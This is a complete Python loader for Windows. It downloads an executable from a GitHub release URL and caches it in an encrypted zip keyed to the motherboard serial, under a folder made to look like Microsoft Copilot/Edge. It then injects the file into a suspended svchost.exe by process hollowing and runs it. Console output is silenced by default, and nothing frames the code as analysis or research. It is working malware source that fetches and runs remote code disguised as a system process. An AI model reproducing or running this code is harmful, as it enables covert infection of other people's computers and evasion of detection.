import ctypes
import struct
import os
import io
import subprocess
import time
import requests
import pyzipper
import hashlib
from ctypes import wintypes

# DEBUG MODE TOGGLE
# If False, no output will be printed to the console.
DEBUG_MODE = False

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll')

# Constants
CREATE_SUSPENDED = 0x00000004
CONTEXT_FULL = 0x10001F
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# STARTUPINFOW structure
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              wintypes.DWORD),
        ("lpReserved",      wintypes.LPWSTR),
        ("lpDesktop",       wintypes.LPWSTR),
        ("lpTitle",         wintypes.LPWSTR),
        ("dwX",             wintypes.DWORD),
        ("dwY",             wintypes.DWORD),
        ("dwXSize",         wintypes.DWORD),
        ("dwYSize",         wintypes.DWORD),
        ("dwXCountChars",   wintypes.DWORD),
        ("dwYCountChars",   wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags",         wintypes.DWORD),
        ("wShowWindow",     wintypes.WORD),
        ("cbReserved2",     wintypes.WORD),
        ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput",       wintypes.HANDLE),
        ("hStdOutput",      wintypes.HANDLE),
        ("hStdError",       wintypes.HANDLE),
    ]

# PROCESS_INFORMATION structure
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),
    ]

# CONTEXT structure (x64)
class CONTEXT64(ctypes.Structure):
    _fields_ = [
        ("P1Home",              ctypes.c_uint64),
        ("P2Home",              ctypes.c_uint64),
        ("P3Home",              ctypes.c_uint64),
        ("P4Home",              ctypes.c_uint64),
        ("P5Home",              ctypes.c_uint64),
        ("P6Home",              ctypes.c_uint64),
        ("ContextFlags",        wintypes.DWORD),
        ("MxCsr",               wintypes.DWORD),
        ("SegCs",               wintypes.WORD),
        ("SegDs",               wintypes.WORD),
        ("SegEs",               wintypes.WORD),
        ("SegFs",               wintypes.WORD),
        ("SegGs",               wintypes.WORD),
        ("SegSs",               wintypes.WORD),
        ("EFlags",              wintypes.DWORD),
        ("Dr0",                 ctypes.c_uint64),
        ("Dr1",                 ctypes.c_uint64),
        ("Dr2",                 ctypes.c_uint64),
        ("Dr3",                 ctypes.c_uint64),
        ("Dr6",                 ctypes.c_uint64),
        ("Dr7",                 ctypes.c_uint64),
        ("Rax",                 ctypes.c_uint64),
        ("Rcx",                 ctypes.c_uint64),
        ("Rdx",                 ctypes.c_uint64),
        ("Rbx",                 ctypes.c_uint64),
        ("Rsp",                 ctypes.c_uint64),
        ("Rbp",                 ctypes.c_uint64),
        ("Rsi",                 ctypes.c_uint64),
        ("Rdi",                 ctypes.c_uint64),
        ("R8",                  ctypes.c_uint64),
        ("R9",                  ctypes.c_uint64),
        ("R10",                 ctypes.c_uint64),
        ("R11",                 ctypes.c_uint64),
        ("R12",                 ctypes.c_uint64),
        ("R13",                 ctypes.c_uint64),
        ("R14",                 ctypes.c_uint64),
        ("R15",                 ctypes.c_uint64),
        ("Rip",                 ctypes.c_uint64),
        ("FltSave",             ctypes.c_byte * 512),
        ("VectorRegister",      ctypes.c_byte * 416),
        ("VectorControl",       ctypes.c_uint64),
        ("DebugControl",        ctypes.c_uint64),
        ("LastBranchToRip",     ctypes.c_uint64),
        ("LastBranchFromRip",   ctypes.c_uint64),
        ("LastExceptionToRip",  ctypes.c_uint64),
        ("LastExceptionFromRip",ctypes.c_uint64),
    ]

# CreateProcessW function signature
kernel32.CreateProcessW.restype = wintypes.BOOL
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR,                # lpApplicationName
    wintypes.LPWSTR,                 # lpCommandLine
    ctypes.c_void_p,                 # lpProcessAttributes
    ctypes.c_void_p,                 # lpThreadAttributes
    wintypes.BOOL,                   # bInheritHandles
    wintypes.DWORD,                  # dwCreationFlags
    ctypes.c_void_p,                 # lpEnvironment
    wintypes.LPCWSTR,                # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOW),    # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),  # lpProcessInformation
]

# GetThreadContext function signature
kernel32.GetThreadContext.restype = wintypes.BOOL
kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(CONTEXT64),
]

# ReadProcessMemory function signature
kernel32.ReadProcessMemory.restype = wintypes.BOOL
kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpBaseAddress
    ctypes.c_void_p,        # lpBuffer
    ctypes.c_size_t,        # nSize
    ctypes.POINTER(ctypes.c_size_t),  # lpNumberOfBytesRead
]

# NtUnmapViewOfSection function signature
ntdll.NtUnmapViewOfSection.restype = wintypes.LONG  # NTSTATUS
ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_uint64,        # BaseAddress
]

# VirtualAllocEx function signature
kernel32.VirtualAllocEx.restype = ctypes.c_uint64
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpAddress
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]

# WriteProcessMemory function signature
kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpBaseAddress
    ctypes.c_void_p,        # lpBuffer
    ctypes.c_size_t,        # nSize
    ctypes.POINTER(ctypes.c_size_t),  # lpNumberOfBytesWritten
]

# SetThreadContext function signature
kernel32.SetThreadContext.restype = wintypes.BOOL
kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(CONTEXT64),
]

# ResumeThread function signature
kernel32.ResumeThread.restype = wintypes.DWORD
kernel32.ResumeThread.argtypes = [
    wintypes.HANDLE,        # hThread
]

def create_suspended_process(exe_path: str):
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    pi = PROCESS_INFORMATION()

    success = kernel32.CreateProcessW(
        exe_path,           # lpApplicationName
        None,               # lpCommandLine
        None,               # lpProcessAttributes
        None,               # lpThreadAttributes
        False,              # bInheritHandles
        CREATE_SUSPENDED,   # dwCreationFlags
        None,               # lpEnvironment
        None,               # lpCurrentDirectory
        ctypes.byref(si),   # lpStartupInfo
        ctypes.byref(pi),   # lpProcessInformation
    )

    if not success:
        error_code = ctypes.get_last_error()
        raise ctypes.WinError(error_code)

    if DEBUG_MODE:
        print(f"[+] Process created successfully (SUSPENDED)")
        print(f"    PID:  {pi.dwProcessId}")
        print(f"    TID:  {pi.dwThreadId}")

    return pi

def unmap_process_image(pi):
    # Get thread context (Rdx = PEB address)
    ctx = CONTEXT64()
    ctx.ContextFlags = CONTEXT_FULL

    success = kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    # Read ImageBaseAddress from PEB (PEB + 0x10 offset, x64)
    peb_address = ctx.Rdx
    image_base_addr_ptr = peb_address + 0x10

    image_base = ctypes.c_uint64(0)
    bytes_read = ctypes.c_size_t(0)

    success = kernel32.ReadProcessMemory(
        pi.hProcess,
        image_base_addr_ptr,
        ctypes.byref(image_base),
        ctypes.sizeof(image_base),
        ctypes.byref(bytes_read),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] PEB Address:        0x{peb_address:016X}")
        print(f"[+] Image Base Address: 0x{image_base.value:016X}")

    # Unmap image from memory using NtUnmapViewOfSection
    status = ntdll.NtUnmapViewOfSection(pi.hProcess, image_base.value)

    if status != 0:
        raise RuntimeError(f"NtUnmapViewOfSection failed. NTSTATUS: 0x{status & 0xFFFFFFFF:08X}")

    if DEBUG_MODE:
        print(f"[+] Image unmapped successfully from memory")

    return peb_address, image_base.value

def get_motherboard_serial() -> str:
    """Get motherboard serial number using PowerShell (without using wmic)."""
    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command",
         "(Get-CimInstance Win32_BaseBoard).SerialNumber"],
        capture_output=True, text=True, creationflags=0x08000000  # CREATE_NO_WINDOW
    )
    serial = result.stdout.strip()
    if not serial:
        raise RuntimeError("Could not retrieve motherboard serial number.")
    return serial

def _download_to_ram(download_url: str) -> bytes:
    max_retries = 3
    for attempt in range(1, max_retries + 1):
        try:
            resp = requests.get(download_url, timeout=120, stream=True,
                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            resp.raise_for_status()
            buf = io.BytesIO()
            for chunk in resp.iter_content(chunk_size=65536):
                buf.write(chunk)
            payload_data = buf.getvalue()
            return payload_data
        except Exception as e:
            if DEBUG_MODE:
                print(f"[-] Download attempt {attempt}/{max_retries} failed: {e}")
            if attempt == max_retries:
                raise
            time.sleep(3)

def _save_encrypted_zip(zip_path: str, password_bytes: bytes, inner_name: str, payload_data: bytes):
    os.makedirs(os.path.dirname(zip_path), exist_ok=True)
    with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password_bytes)
        zf.writestr(inner_name, payload_data)
    if DEBUG_MODE:
        print(f"[+] Encrypted zip saved to disk: {zip_path}")

def get_payload(zip_path: str, zip_password: str, download_url: str, hash_url: str) -> bytes:
    """
    If zip_path exists, it opens the exe inside with zip_password and reads it into RAM.
    It takes the SHA256 value from the Hash URL and compares it with the hash of the read/downloaded current exe.
    If there is an old file but the hash does not match, it re-downloads the exe into RAM, zips it with the password, and overwrites it.
    """
    password_bytes = zip_password.encode('utf-8')
    inner_name = "svchost.exe"
    payload_data = None

    # Get remote hash
    remote_hash = None
    try:
        remote_hash_resp = requests.get(hash_url, timeout=30)
        remote_hash_resp.raise_for_status()
        remote_hash = remote_hash_resp.text.strip().lower()
        if DEBUG_MODE:
            print(f"[+] Remote hash retrieved: {remote_hash}")
    except Exception as e:
        if DEBUG_MODE:
            print(f"[-] Could not retrieve remote hash, update check may be skipped: {e}")

    # If zip exists, read it into RAM
    if os.path.exists(zip_path):
        if DEBUG_MODE:
            print(f"[+] Existing zip found: {zip_path}")
        try:
            with pyzipper.AESZipFile(zip_path, 'r', encryption=pyzipper.WZ_AES) as zf:
                zf.setpassword(password_bytes)
                payload_data = zf.read(inner_name)
            if DEBUG_MODE:
                print(f"[+] Exe read from zip to RAM ({len(payload_data)} bytes)")
        except Exception as e:
            if DEBUG_MODE:
                print(f"[-] Zip read error: {e}")
            payload_data = None

    needs_download = False
    
    if payload_data is None:
        needs_download = True
    elif remote_hash:
        # Calculate local hash
        local_hash = hashlib.sha256(payload_data).hexdigest().lower()
        if local_hash != remote_hash:
            if DEBUG_MODE:
                print(f"[-] Hash mismatch. Local: {local_hash} | Remote: {remote_hash}")
            needs_download = True
        else:
            if DEBUG_MODE:
                print(f"[+] Hash verified. No re-download needed.")

    # If it was never downloaded or the hash is different, download and encrypt-save
    if needs_download:
        if DEBUG_MODE:
            print(f"[+] Zip missing or update required. Downloading: {download_url}")
        payload_data = _download_to_ram(download_url)
        if DEBUG_MODE:
            print(f"[+] Exe downloaded to RAM ({len(payload_data)} bytes)")

        # Warn if newly downloaded file hash doesn't match remote_hash either
        if remote_hash:
            new_hash = hashlib.sha256(payload_data).hexdigest().lower()
            if new_hash != remote_hash:
                if DEBUG_MODE:
                    print(f"[!] WARNING: Newly downloaded file hash also mismatch: {new_hash}")
        
        _save_encrypted_zip(zip_path, password_bytes, inner_name, payload_data)

    return payload_data

def inject_payload(pi, payload_data: bytes, image_base: int):
    # Parse PE header
    # DOS Header -> e_lfanew (offset 0x3C, 4 bytes)
    e_lfanew = struct.unpack_from("<I", payload_data, 0x3C)[0]

    # PE Signature (4) + COFF Header (20) = 24 bytes, then Optional Header
    # Optional Header offset = e_lfanew + 24
    opt_header_offset = e_lfanew + 24

    # AddressOfEntryPoint (Optional Header + 16 offset, 4 bytes)
    entry_point_rva = struct.unpack_from("<I", payload_data, opt_header_offset + 16)[0]
    # SizeOfImage (Optional Header + 56 offset, 4 bytes)
    size_of_image = struct.unpack_from("<I", payload_data, opt_header_offset + 56)[0]
    # SizeOfHeaders (Optional Header + 60 offset, 4 bytes)
    size_of_headers = struct.unpack_from("<I", payload_data, opt_header_offset + 60)[0]

    if DEBUG_MODE:
        print(f"[+] Payload size: {len(payload_data)} bytes")
        print(f"    SizeOfImage:   0x{size_of_image:08X}")
        print(f"    SizeOfHeaders: 0x{size_of_headers:08X}")

    # Allocate memory in target process using VirtualAllocEx
    remote_base = kernel32.VirtualAllocEx(
        pi.hProcess,
        image_base,                         # preferred address (where unmapped)
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )

    if not remote_base:
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] VirtualAllocEx successful: 0x{remote_base:016X}")

    # Write PE headers
    header_buf = (ctypes.c_byte * size_of_headers)(*payload_data[:size_of_headers])
    bytes_written = ctypes.c_size_t(0)

    success = kernel32.WriteProcessMemory(
        pi.hProcess,
        remote_base,
        header_buf,
        size_of_headers,
        ctypes.byref(bytes_written),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] PE Header written ({bytes_written.value} bytes)")

    # Write sections
    # NumberOfSections: COFF Header + 2 offset (e_lfanew + 6)
    num_sections = struct.unpack_from("<H", payload_data, e_lfanew + 6)[0]
    # SizeOfOptionalHeader: COFF Header + 16 offset (e_lfanew + 20)
    size_of_optional_header = struct.unpack_from("<H", payload_data, e_lfanew + 20)[0]

    # First section header offset = e_lfanew + 24 + SizeOfOptionalHeader
    section_header_offset = e_lfanew + 24 + size_of_optional_header

    for i in range(num_sections):
        # Each section header is 40 bytes
        sh_offset = section_header_offset + (i * 40)
        section_name = payload_data[sh_offset:sh_offset + 8].rstrip(b'\x00').decode('ascii', errors='replace')
        virtual_size    = struct.unpack_from("<I", payload_data, sh_offset + 8)[0]
        virtual_address = struct.unpack_from("<I", payload_data, sh_offset + 12)[0]
        raw_size        = struct.unpack_from("<I", payload_data, sh_offset + 16)[0]
        raw_offset      = struct.unpack_from("<I", payload_data, sh_offset + 20)[0]

        if raw_size == 0:
            continue

        section_data = payload_data[raw_offset:raw_offset + raw_size]
        section_buf = (ctypes.c_byte * len(section_data))(*section_data)
        bytes_written = ctypes.c_size_t(0)

        success = kernel32.WriteProcessMemory(
            pi.hProcess,
            remote_base + virtual_address,
            section_buf,
            len(section_data),
            ctypes.byref(bytes_written),
        )
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())

        if DEBUG_MODE:
            print(f"    Section '{section_name}' written -> RVA: 0x{virtual_address:08X} ({bytes_written.value} bytes)")

    if DEBUG_MODE:
        print(f"[+] All sections written successfully")

    return remote_base, entry_point_rva

def set_entry_point(pi, peb_address: int, remote_base: int, entry_point_rva: int):
    # 1. Update ImageBaseAddress in PEB (PEB + 0x10)
    new_base = ctypes.c_uint64(remote_base)
    bytes_written = ctypes.c_size_t(0)

    success = kernel32.WriteProcessMemory(
        pi.hProcess,
        peb_address + 0x10,
        ctypes.byref(new_base),
        ctypes.sizeof(new_base),
        ctypes.byref(bytes_written),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] PEB ImageBase updated -> 0x{remote_base:016X}")

    # 2. Get thread context and redirect RIP to new entry point
    ctx = CONTEXT64()
    ctx.ContextFlags = CONTEXT_FULL

    success = kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    old_rip = ctx.Rcx
    new_rip = remote_base + entry_point_rva
    ctx.Rcx = new_rip

    success = kernel32.SetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] Thread Context updated")
        print(f"    Old RCX (Entry): 0x{old_rip:016X}")
        print(f"    New RCX (Entry): 0x{new_rip:016X}")

def resume_thread(pi):
    result = kernel32.ResumeThread(pi.hThread)
    if result == 0xFFFFFFFF:  # (DWORD)-1
        raise ctypes.WinError(ctypes.get_last_error())

    if DEBUG_MODE:
        print(f"[+] Thread resumed (ResumeThread). Process is now running.")

if __name__ == "__main__":
    target = r"C:\Windows\System32\svchost.exe"
    download_url = "https://github.com/dearfbiiamsorry/sitting_chair/releases/download/sorry/svchost.exe"
    hash_url = "https://github.com/dearfbiiamsorry/sitting_chair/releases/download/sorry/hash.txt"

    # Get motherboard serial number
    serial = get_motherboard_serial()
    if DEBUG_MODE:
        print(f"[+] Motherboard Serial: {serial}")

    # Zip path
    zip_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "LocalLow", "Microsoft", "Copilot", "Edge")
    zip_path = os.path.join(zip_dir, "edge.zip")

    # Get payload (to RAM) - with hash verification
    payload_data = get_payload(zip_path, serial, download_url, hash_url)

    # Process hollowing
    pi = create_suspended_process(target)
    peb_address, image_base = unmap_process_image(pi)
    remote_base, entry_point_rva = inject_payload(pi, payload_data, image_base)
    set_entry_point(pi, peb_address, remote_base, entry_point_rva)
    resume_thread(pi)
